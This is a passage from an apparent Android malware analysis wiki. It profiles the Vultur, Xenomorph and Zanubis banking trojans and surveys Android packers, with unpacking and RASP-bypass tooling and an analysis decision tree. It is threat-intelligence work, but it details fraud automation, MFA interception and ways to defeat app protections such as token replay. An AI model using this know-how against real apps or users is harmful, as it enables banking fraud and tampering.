templates. When the accessibility service detects a target app in the foreground, Vultur starts a VNC recording session. The operator watches the session in real time through the ngrok tunnel.</p>"},{"location":"malware/families/vultur/#v2-additions-2024","title":"v2 Additions (2024)","text":"<p>Fox-IT's analysis documented 7 new C2 methods and 41 new Firebase Cloud Messaging (FCM) commands in the updated version:</p> Capability Implementation Accessibility remote control Taps, scrolls, swipes via accessibility service (supplements VNC) File manager Download, upload, delete, find, install files App blocking Prevent specified apps from launching Keyguard control Disable device lock screen Custom notifications Display attacker-crafted notifications to lure user interaction Encrypted C2 AES-encrypted command and control communication Multi-payload loading Three payloads (2 APKs + 1 DEX) decoded and loaded sequentially <p>The 2024 version retains AlphaVNC and ngrok but adds accessibility-based remote interaction as a parallel control mechanism. This gives operators two modes: passive observation through VNC streaming and active device manipulation through accessibility commands.</p>"},{"location":"malware/families/vultur/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/vultur/#alphavnc-integration","title":"AlphaVNC Integration","text":"<p>Vultur embeds a real VNC server implementation taken from the AlphaVNC project. The VNC server runs as a background service, capturing the device screen and serving it over a local VNC port.</p>"},{"location":"malware/families/vultur/#ngrok-tunneling","title":"ngrok Tunneling","text":"<p>Since the VNC server is bound to localhost on the infected device, the malware uses ngrok to create a tunnel:</p> <ol> <li>Vultur starts the AlphaVNC server on a local port</li> <li>ngrok client connects to ngrok's relay infrastructure</li> <li>The relay assigns a public endpoint that forwards traffic to the local VNC port</li> <li>The operator connects to the public ngrok endpoint with a VNC client</li> </ol> <p>This avoids the need for the device to have a public IP or for the C2 to handle VNC relay directly.</p>"},{"location":"malware/families/vultur/#c2-communication","title":"C2 Communication","text":"<p>v1:</p> Component Details Protocol HTTPS for commands, ngrok for VNC Bot registration Device info, installed apps, country code sent at registration Commands Start/stop recording, keylogger toggle, SMS interception config <p>v2 (2024):</p> Component Details Protocol HTTPS with AES encryption Push channel Firebase Cloud Messaging (41 commands) C2 methods 7 new methods for file operations, app blocking, notification control Payload delivery 3-stage: 2 APKs + 1 DEX file, each encrypted Obfuscation Multiple encrypted payloads decrypted at runtime, legitimate app disguise"},{"location":"malware/families/vultur/#payload-structure-v2","title":"Payload Structure (v2)","text":"<p>The 2024 dropper (McAfee Security impersonation) executes three payloads in sequence:</p> <ol> <li>First APK: Registers the bot with C2, establishes initial communication</li> <li>Second APK: Obtains accessibility service permissions, sets up AlphaVNC and ngrok</li> <li>DEX file: Provides additional commands, fetched and executed from C2</li> </ol>"},{"location":"malware/families/vultur/#target-regions-and-financial-institutions","title":"Target Regions and Financial Institutions","text":"Region Details Italy Largest number of targeted banking apps Australia Second-highest target concentration Spain Significant banking app targeting UK Added in later campaigns <p>Vultur's VNC-based approach means any app on the device is effectively a target, since the operator sees exactly what the user sees. The formal \"target list\" determines when recording sessions start automatically, but operators can initiate recording at any time.</p>"},{"location":"malware/families/vultur/#notable-campaigns","title":"Notable Campaigns","text":"<p>March 2021: ThreatFabric disclosed Vultur as the first Android banking trojan to use VNC-based screen recording instead of overlay injection. Initial campaigns targeted Italian, Australian, and Spanish banks, distributed through Brunhilda dropper apps on Google Play with 5,000+ installs.</p> <p>November 2021: ThreatFabric documented the Brunhilda dropper ecosystem, identifying Vultur as one of multiple banking trojans delivered through the DaaS operation alongside Alien and other families.</p> <p>2022-2023: Vultur maintained steady operations through Brunhilda droppers on Google Play. Multiple dropper apps were identified and removed in successive rounds, with the operators consistently uploading new variants.</p> <p>March 2024: NCC Group's Fox-IT published detailed analysis of Vultur's major update. The new version added 7 C2 methods, 41 FCM commands, file management, app blocking, and encrypted communications. Distribution shifted to TOAD: a smishing + voice phishing chain delivering a trojanized McAfee Security app.</p> <p>April 2024: Bleeping Computer reported on the McAfee impersonation campaign, noting the sophistication of the TOAD delivery chain where human operators guided victims through the installation process.</p>"},{"location":"malware/families/vultur/#references","title":"References","text":""},{"location":"malware/families/xenomorph/","title":"Xenomorph","text":"<p>Xenomorph is an Android banking trojan developed by the Hadoken Security Group, notable for its rapid feature iteration across three major versions between February 2022 and mid-2023. Version 3 introduced a full ATS (Automated Transfer System) engine powered by a JSON-based scripting runtime that executes fraud workflows autonomously on the victim's device. With 400+ targeted financial institutions spanning multiple continents, Xenomorph represents the trajectory of modern Android bankers: fast development cycles, MaaS ambitions, and increasingly autonomous on-device fraud.</p>"},{"location":"malware/families/xenomorph/#overview","title":"Overview","text":"Attribute Details First Seen February 2022 Status Active (2024) Type Banking trojan, ATS fraud Aliases Xenomorph.A (v1), Xenomorph.B (v2), Xenomorph.C (v3) Attribution Hadoken Security Group Distribution Google Play (via GymDrop, Zombinder), direct download"},{"location":"malware/families/xenomorph/#origin-and-lineage","title":"Origin and Lineage","text":"<p>ThreatFabric discovered Xenomorph in February 2022 on the Google Play Store, where it had accumulated over 50,000 downloads through a dropper disguised as a \"Fast Cleaner\" utility. At discovery, ThreatFabric noted code overlaps with the Alien banking trojan (itself a Cerberus derivative), suggesting the authors studied or borrowed from that codebase.</p> <p>In May 2022, the Hadoken Security Group publicly claimed ownership of Xenomorph and their dropper operation GymDrop on a dark web forum. ThreatFabric attributed both products to the same group, which had been active since at least late 2021 with GymDrop as their initial offering.</p> <p>ThreatFabric also linked BugDrop to Hadoken, a dropper designed to bypass Android 13's restrictions on sideloaded apps requesting accessibility permissions. BugDrop was found in development in August 2022, indicating the group's investment in solving the distribution pipeline alongside the payload itself.</p>"},{"location":"malware/families/xenomorph/#distribution","title":"Distribution","text":"<p>Xenomorph distribution has rotated through multiple dropper services:</p> Period Distribution Method Details Feb 2022 GymDrop on Google Play \"Fast Cleaner\" app, 50,000+ installs Late 2022 Zombinder Payload bound to legitimate currency converter app 2023 Zombinder, direct download Zombinder operators later claimed to shut down Late 2023 Direct distribution sites Fake Chrome/Play Store download pages <p>GymDrop: Hadoken's own dropper operation, managed in-house. Dropper apps on Google Play fetch and install the Xenomorph payload after the initial app passes review.</p> <p>Zombinder: A third-party service that \"binds\" malicious payloads to legitimate APKs. ThreatFabric covered Zombinder in December 2022, documenting how Xenomorph was delivered via a currency converter app that downloaded a fake \"Google Protect\" update containing the actual payload.</p>"},{"location":"malware/families/xenomorph/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/xenomorph/#version-evolution","title":"Version Evolution","text":"Version Date Target Count Key Features v1 (Xenomorph.A) Feb 2022 56 Overlay injection, notification/SMS interception v2 (Xenomorph.B) Jun 2022 ~100 Complete code rewrite, modular architecture, limited wild activity v3 (Xenomorph.C) Mar 2023 400+ Full ATS engine, JSON scripting runtime, cookie stealing, MFA bypass"},{"location":"malware/families/xenomorph/#v1-capabilities","title":"v1 Capabilities","text":"Capability Implementation Overlay injection WebView-based injects for 56 EU banking apps SMS interception Reads and intercepts incoming SMS for 2FA Notification interception Captures notification content via accessibility App listing Reports installed apps to C2 for target matching <p>v1 lacked accessibility logging, remote actions, and any form of ATS. It was a basic overlay banker with limited scope.</p>"},{"location":"malware/families/xenomorph/#v2-architecture","title":"v2 Architecture","text":"<p>ThreatFabric noted that v2 (June 2022) was a complete rewrite that made the codebase modular and extensible. It saw only brief testing bursts in the wild, suggesting it served as a transitional build preparing the architecture for v3's feature set.</p>"},{"location":"malware/families/xenomorph/#v3-ats-engine","title":"v3 ATS Engine","text":"<p>The v3 ATS framework is Xenomorph's defining feature. It operates as a JSON-scripted runtime engine powered by accessibility services:</p> <ol> <li>The C2 sends JSON scripts defining sequences of actions</li> <li>Xenomorph parses the JSON into an ordered list of operations</li> <li>Each operation maps to an accessibility action (tap, swipe, text input, wait, conditional check)</li> <li>The engine executes operations sequentially, handling banking app navigation, credential entry, transfer initiation, and confirmation</li> <li>Third-party authenticator app content is read via accessibility to bypass MFA</li> </ol> <p>The scripting approach means operators can define new fraud workflows without updating the malware binary. Target-specific scripts handle the unique UI flow of each banking app.</p>"},{"location":"malware/families/xenomorph/#v3-full-feature-set","title":"v3 Full Feature Set","text":"Capability Implementation ATS engine JSON-scripted runtime, autonomous transfer execution Overlay injection WebView injects for 400+ targets Keylogging Accessibility event capture SMS/notification interception Read, intercept, suppress messages Cookie stealing Captures session cookies from target apps MFA bypass Reads TOTP codes from authenticator apps via accessibility Screen capture On-demand screenshots sent to C2 Anti-removal Prevents uninstall through accessibility"},{"location":"malware/families/xenomorph/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/xenomorph/#modular-architecture-v2","title":"Modular Architecture (v2+)","text":"<p>The v2 rewrite introduced a module-based system where each capability runs as an independent component. Modules can be loaded, updated, or replaced without modifying the core malware binary. This design carried forward into v3 and enabled the ATS engine to be delivered as an add-on module.</p>"},{"location":"malware/families/xenomorph/#ats-script-structure","title":"ATS Script Structure","text":"<p>The ATS engine processes JSON-formatted scripts from C2. Each script defines:</p> <ul> <li>Target: the package name of the banking app</li> <li>Steps: ordered array of accessibility actions</li> <li>Conditions: checks for UI state before proceeding (e.g., verify a button is visible)</li> <li>Data: transfer parameters (recipient, amount) injected into the flow</li> </ul> <p>The engine handles error recovery, retrying steps when expected UI elements are not found within a timeout period.</p>"},{"location":"malware/families/xenomorph/#c2-communication","title":"C2 Communication","text":"Component Details Protocol HTTPS Data format JSON payloads Configuration Target lists, inject URLs, ATS scripts delivered per-device based on installed apps Commands Install module, update config, execute ATS script, capture screen, steal cookies"},{"location":"malware/families/xenomorph/#target-regions-and-financial-institutions","title":"Target Regions and Financial Institutions","text":"Version Regions Notable Targets v1 Spain, Portugal, Italy, Belgium 56 EU banking apps v2 Same as v1, expanded ~100 apps v3 EU, US, Middle East, Asia 400+ banking apps, cryptocurrency wallets <p>ThreatFabric's v3 analysis noted the target list expansion represented a 6x increase over prior versions, with institutions spanning all continents.</p> <p>September 2023 US expansion: ThreatFabric documented Xenomorph targeting 30+ US financial institutions including Chase, Citi, Bank of America, Capital One, and multiple cryptocurrency platforms. This marked the first deliberate US campaign.</p>"},{"location":"malware/families/xenomorph/#notable-campaigns","title":"Notable Campaigns","text":"<p>February 2022: ThreatFabric identified Xenomorph v1 on Google Play via a \"Fast Cleaner\" dropper app with 50,000+ downloads. The malware targeted 56 European banking apps with overlay injection and SMS interception.</p> <p>May 2022: Hadoken Security Group claimed ownership of Xenomorph and GymDrop on a dark web forum, establishing public attribution.</p> <p>June 2022: Xenomorph v2 appeared in brief testing campaigns. ThreatFabric noted the complete code overhaul and modular architecture as preparation for future capabilities.</p> <p>August 2022: ThreatFabric discovered BugDrop, a Hadoken-developed dropper designed to bypass Android 13's sideloading restrictions, indicating the group was actively investing in distribution infrastructure.</p> <p>March 2023: Xenomorph v3 was disclosed by ThreatFabric, distributed via Zombinder-bound currency converter apps. The ATS engine and expanded target list of 400+ institutions represented a major operational leap.</p> <p>September 2023: ThreatFabric reported Xenomorph targeting 30+ US banks for the first time, distributed through fake Chrome browser download pages rather than Play Store droppers.</p>"},{"location":"malware/families/xenomorph/#references","title":"References","text":""},{"location":"malware/families/zanubis/","title":"Zanubis","text":"<p>Zanubis is a Peruvian Android banking trojan that evolved from a simple overlay banker targeting local financial institutions to a sophisticated multi-faceted threat impersonating government services. Kaspersky first covered the family in a September 2023 crimeware report and published a detailed evolution analysis in March 2025 documenting its expansion from 40 banking app targets to government agency impersonation, including spoofing SUNAT (Peru's national tax authority).</p>"},{"location":"malware/families/zanubis/#overview","title":"Overview","text":"Attribute Details First Seen 2022 Last Seen Active (ongoing campaigns) Status Active, expanding target scope Type Banking trojan with overlay attacks and ATS Attribution Unknown; operations focused on Peru Aliases None known"},{"location":"malware/families/zanubis/#vendor-names","title":"Vendor Names","text":"Vendor Name Kaspersky HEUR:Trojan-Banker.AndroidOS.Zanubis ESET Android/Spy.Banker.Zanubis McAfee Android/Zanubis"},{"location":"malware/families/zanubis/#origin-and-lineage","title":"Origin and Lineage","text":"<p>Zanubis is independently developed with no direct code connection to other documented families. It is one of the few banking trojans specifically targeting the Peruvian financial sector, operating in the same Latin American space as PixPirate (Brazil) and ToxicPanda (originally Southeast Asia, expanded to LATAM).</p>"},{"location":"malware/families/zanubis/#evolution","title":"Evolution","text":"Phase Period Capabilities Initial 2022 Basic overlay banker targeting Peruvian banking apps Expansion 2023 Added government app impersonation, broader targeting Mature 2024-2025 Full ATS, SUNAT spoofing, energy sector expansion"},{"location":"malware/families/zanubis/#distribution","title":"Distribution","text":"Vector Details Smishing SMS messages impersonating SUNAT (tax authority) with fake tax notices Fake government apps APKs disguised as SUNAT official applications Fake banking apps APKs impersonating Peruvian banking apps Social engineering Urgency-based lures about tax penalties and legal obligations <p>The government impersonation distribution is particularly effective in Peru, where SUNAT communications carry legal weight. Users receiving what appears to be an official tax notice are motivated to install the \"SUNAT app\" to resolve the supposed issue.</p>"},{"location":"malware/families/zanubis/#capabilities","title":"Capabilities","text":"Capability Description Overlay attacks Credential phishing overlays over 40+ banking apps ATS (Automated Transfer Systems) Automated fund transfers via accessibility service Keylogging Accessibility-based keystroke capture SMS interception Reads and intercepts OTP codes Screen recording Records device screen during banking sessions Contact exfiltration Uploads contact list for targeting App impersonation Disguises as SUNAT tax authority app Persistence Prevents uninstallation via accessibility"},{"location":"malware/families/zanubis/#permissions","title":"Permissions","text":"Permission Purpose BIND_ACCESSIBILITY_SERVICE Overlay triggering, ATS automation, keylogging, persistence, foreground app monitoring SYSTEM_ALERT_WINDOW Display phishing overlays and SUNAT impersonation UI READ_SMS Read SMS messages for OTP interception RECEIVE_SMS Real-time SMS interception SEND_SMS Send SMS from victim device READ_CONTACTS Contact exfiltration for targeting READ_PHONE_STATE Device fingerprinting INTERNET HTTP and WebSocket C2 communication FOREGROUND_SERVICE Persistent background operation RECEIVE_BOOT_COMPLETED Restart after device reboot WAKE_LOCK Keep device active during ATS operations QUERY_ALL_PACKAGES Enumerate installed apps for target matching REQUEST_IGNORE_BATTERY_OPTIMIZATIONS Prevent system from killing background processes"},{"location":"malware/families/zanubis/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/zanubis/#overlay-injection","title":"Overlay Injection","text":"<p>Zanubis uses standard overlay attack techniques:</p> <ul> <li>Monitors foreground app changes via accessibility service</li> <li>Matches against a target list of 40+ Peruvian banking and financial apps</li> <li>Displays WebView-based phishing overlays matching the target app's login screen</li> <li>Captured credentials sent to C2</li> </ul>"},{"location":"malware/families/zanubis/#sunat-impersonation","title":"SUNAT Impersonation","text":"<p>The government impersonation component displays a convincing SUNAT interface while the malware operates in the background. The fake SUNAT app:</p> <ul> <li>Shows official SUNAT branding and color scheme</li> <li>Displays fake tax documents and payment forms</li> <li>Requests personal information (DNI, RUC tax numbers)</li> <li>Runs banking overlay monitoring in the background</li> </ul>"},{"location":"malware/families/zanubis/#c2-communication","title":"C2 Communication","text":"<ul> <li>HTTP-based C2 with JSON payloads</li> <li>WebSocket connections for real-time operator control during ATS operations</li> <li>Configuration and target list updates from C2</li> <li>Encrypted exfiltration of captured credentials</li> </ul>"},{"location":"malware/families/zanubis/#target-regions","title":"Target Regions","text":"Region Details Peru Primary and near-exclusive target <p>Target institutions include major Peruvian banks (BCP, BBVA Peru, Interbank, Scotiabank Peru) and government services (SUNAT). The narrow geographic focus parallels PixPirate's Brazil-exclusive targeting and Copybara's Italy-focused operations.</p>"},{"location":"malware/families/zanubis/#notable-campaigns","title":"Notable Campaigns","text":"<p>2022: Zanubis first appears targeting Peruvian banking customers with basic overlay attacks.</p> <p>2023, September: Kaspersky includes Zanubis in a crimeware report alongside ASMCrypt and Lumma, documenting its initial technical capabilities.</p> <p>2024-2025: Zanubis evolves significantly. Kaspersky publishes a full evolution analysis documenting the transition from simple banking overlay trojan to a sophisticated threat with SUNAT government impersonation, energy sector targeting, and ATS capabilities. The target list expands to 40+ financial apps.</p>"},{"location":"malware/families/zanubis/#c2-infrastructure","title":"C2 Infrastructure","text":"Component Details Primary protocol HTTP with JSON payloads Real-time channel WebSocket for operator-controlled ATS sessions Configuration Target app list and overlay templates delivered from C2 Credential exfiltration Encrypted POST requests to C2 Command polling Regular interval polling for new instructions"},{"location":"malware/families/zanubis/#detection","title":"Detection","text":"Indicator Type Details SUNAT impersonation App using official SUNAT branding, requesting tax identifiers (DNI, RUC) Accessibility abuse App requesting accessibility with no legitimate UI-assistance purpose Overlay activity WebView-based windows rendered over Peruvian banking applications Target app monitoring Continuous foreground app monitoring via accessibility events ATS behavior Automated navigation through banking app transfer flows Peruvian focus Hardcoded references to BCP, BBVA Peru, Interbank, Scotiabank Peru, and SUNAT"},{"location":"malware/families/zanubis/#related-families","title":"Related Families","text":"Family Relationship PixPirate Both target a single Latin American country exclusively (Zanubis targets Peru, PixPirate targets Brazil). Both implement ATS for automated fraud. ToxicPanda Both use ATS capabilities for automated fund transfers, though ToxicPanda originated in Southeast Asia before expanding to LATAM and Europe. Copybara Both demonstrate the pattern of country-specific banking trojans with narrow geographic focus and deep local targeting. GodFather Zanubis's overlay injection approach follows the standard model established by earlier families like GodFather and Anubis."},{"location":"malware/families/zanubis/#references","title":"References","text":"<ul> <li>Kaspersky - Crimeware report: ASMCrypt, Lumma, Zanubis (September 2023)</li> <li>Kaspersky - Evolution of Zanubis banking trojan (March 2025)</li> </ul>"},{"location":"packers/","title":"Android Packers &amp; Obfuscators","text":"<p>Packers (protectors, armoring tools) transform APKs to resist reverse engineering, tampering, and automated analysis. Legitimate developers use them to protect IP. Malware authors use them to evade detection and slow down analysts.</p> <p>Obfuscators are a lighter category: they transform code to make it harder to read but don't encrypt or pack DEX files. Many protection products combine both.</p> <p>APKiD can identify most commercial packers and obfuscators automatically.</p>"},{"location":"packers/#packers-protectors","title":"Packers / Protectors","text":"Packer Vendor Origin Status 360 Jiagu Qihoo 360 China Documented APKProtect Nagain China Documented Arxan (Digital.ai) Digital.ai USA Documented Baidu Reinforcement Baidu China Documented Bangcle (SecNeo) Bangcle China Documented DexGuard Guardsquare Belgium Documented DexProtector Licel Netherlands Documented iJiami iJiami China Documented NeteaseYiDun NetEase China Documented Promon SHIELD Promon Norway Documented Tencent Legu Tencent China Documented Virbox SenseShield Technology China Documented AppSealing INKA Entworks South Korea Documented LIAPP Lockin Company South Korea Documented Appdome Appdome Inc USA/Israel Documented Zimperium zShield Zimperium USA Documented Verimatrix XTD Verimatrix (now Guardsquare) France Documented"},{"location":"packers/#obfuscators","title":"Obfuscators","text":"Obfuscator Type Notes R8 / ProGuard Free (Google/open source) Default Android build tools. Name obfuscation, dead code removal, optimization. R8 replaced ProGuard. Allatori Commercial Java/Android obfuscator. String encryption, flow obfuscation, watermarking. DashO Commercial PreEmptive Solutions. Obfuscation + tamper detection + analytics. Zelix KlassMaster Commercial Aggressive flow obfuscation, string encryption, stack trace obfuscation. OLLVM Open source Obfuscator-LLVM. Control flow flattening, bogus control flow, string encryption for native code. Used by Mandrake."},{"location":"packers/#protection-capabilities-comparison","title":"Protection Capabilities Comparison","text":"Feature Packers Obfuscators RASP Name obfuscation Yes Yes No String encryption Yes Some No DEX encryption Yes No No Native code wrapping Yes No No Anti-debugging Yes No Yes Anti-tampering Yes No Yes Root detection Some No Yes Emulator detection Some No Yes Runtime self-protection Some No Yes <p>RASP (Runtime Application Self-Protection) products like Promon SHIELD focus on runtime checks rather than code transformation. They detect hostile environments (root, hooking, debugging) and respond at runtime, often combined with a packer or obfuscator.</p>"},{"location":"packers/#malware-families-by-packer","title":"Malware Families by Packer","text":"<p>Commercial packers are increasingly adopted by malware authors. The packer provides anti-analysis protection without the developer needing to build their own.</p> Packer Families Notes Virbox Gigabud, Klopatra, GoldDigger/GoldPickaxe GoldFactory group standardized on Virbox. <code>libvdog.so</code> marker. DexGuard Anatsa, Xenomorph Higher-tier MaaS families use DexGuard's commercial protection. Tencent Legu Triada, various Chinese malware Common in Chinese market. <code>libshella.so</code> / <code>libshellx.so</code> marker. 360 Jiagu Chinese banking trojans, stalkerware <code>libjiagu.so</code> marker. Multi-DEX support. Bangcle Regional malware, adware <code>libsecexe.so</code> / <code>libSecShell.so</code> marker. Custom packers Mandrake, SoumniBot OLLVM-obfuscated native loaders (Mandrake), manifest parsing exploits (SoumniBot) AppSealing Korean banking apps, Unity games <code>libcovault-appsec.so</code> marker. Bypass: AppPealing Xposed module. LIAPP Korean banking apps (KBPay, NH Bank) Hardest Korean protector. Server-side token verification. No public bypass tool. No packer (obfuscation only) Cerberus lineage, SpyNote Rely on string encryption, class renaming, and custom obfuscation instead of commercial packers"},{"location":"packers/#universal-unpacking-toolkit","title":"Universal Unpacking Toolkit","text":"<p>Tools for approaching any packed sample regardless of the specific packer.</p>"},{"location":"packers/#dex-recovery","title":"DEX Recovery","text":"Tool Purpose Packer Coverage frida-dexdump Scans process memory for DEX magic bytes and dumps all loaded DEX files All packers that decrypt DEX into memory (Chinese packers, DexGuard, DexProtector, AppSealing, LIAPP, Appdome, zShield) FART ART-level DEX dumper. Patches <code>dex2oat</code> to dump DEX at compilation time Effective against packers that use <code>InMemoryDexClassLoader</code> DexDump (smartdone) Xposed module for dumping DEX at class loading Older Chinese packers, some DexGuard builds reFrida Pre-built Frida scripts including DEX interception and string decryption Broad coverage with configurable hooks AppPealing Xposed module that disables AppSealing checks and dumps decrypted DEX AppSealing only"},{"location":"packers/#rasp-bypass","title":"RASP Bypass","text":"Tool Purpose Notes Objection Runtime mobile exploration. Built-in root, SSL, and debug bypasses Good starting point, handles common detection patterns Shamiko Zygisk module that hides Magisk root from detection Preferred for Promon SHIELD, Arxan, and LIAPP ZygiskFrida Injects Frida gadget via Zygisk at process spawn Avoids ptrace-based detection. Critical for Arxan, DexProtector, and LIAPP MagiskHide Props Config Modifies device fingerprint properties to defeat emulator detection Useful when running on physical rooted device"},{"location":"packers/#native-analysis","title":"Native Analysis","text":"Tool Purpose When to Use Ghidra + D-810 Native decompiler with OLLVM deobfuscation plugin Arxan guard network, Mandrake native loaders, Promon SHIELD library, zShield post-XXTEA IDA Pro + Keypatch Native disassembler with inline patching Virbox VM interpreter, DexProtector native bridge, LIAPP native library Frida Stalker Instruction-level tracing at runtime Tracing Virbox VM dispatch loop, mapping guard execution in Arxan XXTEA ELF Unpacker (DavidBuchanan314) Decrypts XXTEA-encrypted ELF bodies from zShield native libraries zShield only. Removes outermost protection layer, OLLVM flattening remains"},{"location":"packers/#recommended-lab-setup","title":"Recommended Lab Setup","text":"<pre><code>Physical device (Pixel 5+, rooted with Magisk + Zygisk)\n  \u251c\u2500 Shamiko (hide root from target app)\n  \u251c\u2500 ZygiskFrida (stealth Frida injection)\n  \u251c\u2500 Objection (runtime exploration)\n  \u2514\u2500 mitmproxy (network interception)\n\nAlternative: Android emulator (API 30-33)\n  \u251c\u2500 frida-server on non-default port (rename binary)\n  \u251c\u2500 Burp Suite / mitmproxy with custom CA\n  \u2514\u2500 Note: many commercial packers detect emulators\n</code></pre> <p>Physical devices are strongly preferred for DexProtector, Promon SHIELD, Arxan, LIAPP, and Appdome analysis. These products aggressively detect emulators and virtual environments. Chinese packers, AppSealing, and DexGuard are generally workable in emulators with basic evasion.</p>"},{"location":"packers/#unpacking-strategy","title":"Unpacking Strategy","text":"<pre><code>1. Identify packer (APKiD, manual inspection of native libs)\n2. Choose approach:\n   - Memory dump: hook DexClassLoader/InMemoryDexClassLoader to capture DEX at load time\n   - Process dump: dump /proc/self/maps regions containing DEX magic bytes\n   - Framework hook: intercept ClassLoader to extract loaded classes\n3. Reconstruct DEX from dump\n4. Decompile unpacked DEX normally (JADX, Ghidra)\n</code></pre> <p>For packer-specific unpacking procedures, see the individual packer pages. Frida DEX dumping scripts cover the universal hooking approach.</p>"},{"location":"packers/#custom-packers","title":"Custom Packers","text":"<p>Some malware authors build their own packing solutions rather than using commercial products. These require per-sample analysis but follow predictable patterns.</p> Technique Examples Analysis Approach XOR-encrypted DEX in assets Budget banking trojans, SMS stealers Extract asset, brute-force single-byte XOR key (typically visible in native loader) AES-encrypted second stage Multi-stage droppers Hook <code>javax.crypto.Cipher</code> to intercept key and IV, or extract from native loader Steganographic DEX in images Necro Reverse the pixel-to-byte extraction algorithm from the loader class Manifest manipulation SoumniBot Install on device and dump via <code>adb shell dumpsys package</code>, bypassing parser bugs OLLVM-obfuscated native loader Mandrake D-810 for OLLVM deobfuscation, Frida Stalker for runtime tracing Encrypted shared preferences payload Dropper-style malware Hook <code>SharedPreferences.getString()</code> to capture decrypted payload before loading Split APK abuse Play Store droppers Reassemble all splits into a single APK using <code>bundletool</code>, then analyze normally <p>Custom packers are generally easier to break than commercial ones because they lack the engineering investment in anti-tampering and anti-hooking. The main challenge is identifying the specific decryption mechanism, which is usually straightforward once the native loader or Java-based decryptor is located.</p>"},{"location":"packers/#packer-comparison-matrix","title":"Packer Comparison Matrix","text":"<p>Head-to-head comparison across all documented packers on the features that matter for analysis.</p> Feature Virbox DexGuard DexProtector Arxan Promon Chinese AppSealing LIAPP Appdome zShield Verimatrix DEX encryption Yes Yes (class-level) Yes Partial No Yes (whole DEX) Yes (selective) Yes (full) Yes Yes (.szip) Yes DEX virtualization Yes (core) Optional No No No No No No No No No String encryption VM-based Method calls White-box keys Yes No Basic XOR Weak XOR (native) Native 32-bit key Inlined per-site Native protection Yes Yes Yes Guard network No (RASP) No SO encryption SO encryption SO encryption XXTEA + OLLVM C/C++ obfuscation Anti-Frida Yes Yes Yes Yes Yes Basic Basic (port) Aggressive Multi-vector Syscall-based Yes Anti-root Yes Yes Yes Yes Yes Basic Moderate Magisk-aware Comprehensive Yes Yes Anti-emulator Yes Yes Yes Yes Yes Basic Yes Aggressive Yes Yes Yes White-box crypto No No vTEE CryptoModule Yes No No No No No zKeyBox (separate) EMVCo certified RASP Partial Partial Core feature Yes Primary No Basic Core feature OneShield Integrity checks Full suite Code virtualization DEX + native Optional Hide Access Guard-level No No No No No No No Server-side verification No No No No No No No Yes No No OTA updates Unpacking difficulty Expert Medium-Hard Medium-Hard Hard Medium Easy-Medium Low-Medium Hard Medium-Hard Medium-Hard Medium Public bypass tools None Limited Limited None Limited Generic DEX dump AppPealing None None XXTEA unpacker None"},{"location":"packers/#analysis-decision-tree","title":"Analysis Decision Tree","text":"<p>When encountering a protected sample, use this sequence to minimize wasted effort:</p> <pre><code>Start\n  |\n  \u251c\u2500 Run APKiD\n  \u2502   \u251c\u2500 packer : appsealing \u2192 AppSealing (use AppPealing or Frida kill/signal/alarm hooks)\n  \u2502   \u251c\u2500 packer : Zimperium (zShield) \u2192 zShield (XXTEA unpacker + OLLVM deflattening)\n  \u2502   \u251c\u2500 protector : InsideSecure \u2192 Verimatrix XTD (verify: check for libencryption_*.so)\n  \u2502   \u251c\u2500 protector : Appdome \u2192 Appdome (layered bypass: anti-debug \u2192 anti-root \u2192 anti-Frida \u2192 SSL)\n  \u2502   \u251c\u2500 Other packer identified \u2192 Go to packer-specific page\n  \u2502   \u251c\u2500 Obfuscator only \u2192 Proceed with jadx, use deobfuscation scripts\n  \u2502   \u2514\u2500 Unknown protection \u2192 Manual inspection below\n  |\n  \u251c\u2500 Check native libraries\n  \u2502   \u251c\u2500 libvirbox_*.so \u2192 Virbox (virtualized, needs dynamic analysis)\n  \u2502   \u251c\u2500 libshell*.so \u2192 Tencent Legu\n  \u2502   \u251c\u2500 libjiagu*.so \u2192 Qihoo 360\n  \u2502   \u251c\u2500 libdexguard.so \u2192 DexGuard\n  \u2502   \u251c\u2500 libdexprotector.*.so / libdpboot.so \u2192 DexProtector\n  \u2502   \u251c\u2500 libsecexe.so \u2192 Bangcle\n  \u2502   \u251c\u2500 libcovault-appsec.so \u2192 AppSealing\n  \u2502   \u251c\u2500 libloader.so + Appdome DEX \u2192 Appdome\n  \u2502   \u251c\u2500 libencryption_*.so \u2192 Verimatrix XTD\n  \u2502   \u251c\u2500 lib&lt;random12chars&gt;.so (~3MB, packed ELF) \u2192 zShield\n  \u2502   \u251c\u2500 com.lockincomp.* references \u2192 LIAPP (no APKiD signature yet)\n  \u2502   \u2514\u2500 Unknown .so \u2192 Check strings, imports for packer signatures\n  |\n  \u251c\u2500 Check obfuscation level\n  \u2502   \u251c\u2500 a/b/c class names, no string encryption \u2192 R8/ProGuard only\n  \u2502   \u251c\u2500 Single-char classes + byte[]-&gt;String methods \u2192 DexGuard string encryption\n  \u2502   \u251c\u2500 All strings readable, class names intact \u2192 No obfuscation\n  \u2502   \u2514\u2500 Native JNI stubs replacing Java methods \u2192 Virtualization (Virbox or DexGuard advanced)\n  |\n  \u251c\u2500 Check assets\n  \u2502   \u251c\u2500 assets/AppSealing/ directory \u2192 AppSealing\n  \u2502   \u251c\u2500 *.szip files (~8MB) + truncated .odex \u2192 zShield\n  \u2502   \u2514\u2500 Encrypted blobs \u2192 Generic packer or custom encryption\n  |\n  \u2514\u2500 Choose approach\n      \u251c\u2500 Obfuscation only \u2192 Static analysis with jadx deobfuscation\n      \u251c\u2500 DEX encryption \u2192 frida-dexdump or DexClassLoader hook\n      \u251c\u2500 Virtualization \u2192 Dynamic analysis only (hook VM interpreter)\n      \u251c\u2500 RASP only \u2192 Frida with detection bypass hooks\n      \u251c\u2500 Server-side verification (LIAPP) \u2192 Token replay from clean device\n      \u2514\u2500 White-box crypto (Verimatrix, zKeyBox) \u2192 Code lifting, not key extraction\n</code></pre>"},{"location":"packers/#packer-trends-in-malware-2024-2025","title":"Packer Trends in Malware (2024-2025)","text":"Trend Details Commercial packer adoption Malware authors increasingly use commercial packers (Virbox, DexGuard) rather than custom solutions. Reduces development cost at the expense of identifiable signatures. Multi-layer protection Modern samples combine a commercial packer with custom obfuscation layers. Klopatra uses Virbox + custom string encryption. Packer-as-a-Service Underground forums offer packing services where customers submit APKs and receive protected versions. No need to license the packer directly. Custom packers declining Only sophisticated groups like Mandrake developers invest in custom OLLVM-based protection. Most operators use off-the-shelf solutions. RASP integration Banking trojans increasingly encounter RASP-protected target apps (Promon, Arxan, LIAPP, Appdome), requiring malware to bypass runtime checks to perform 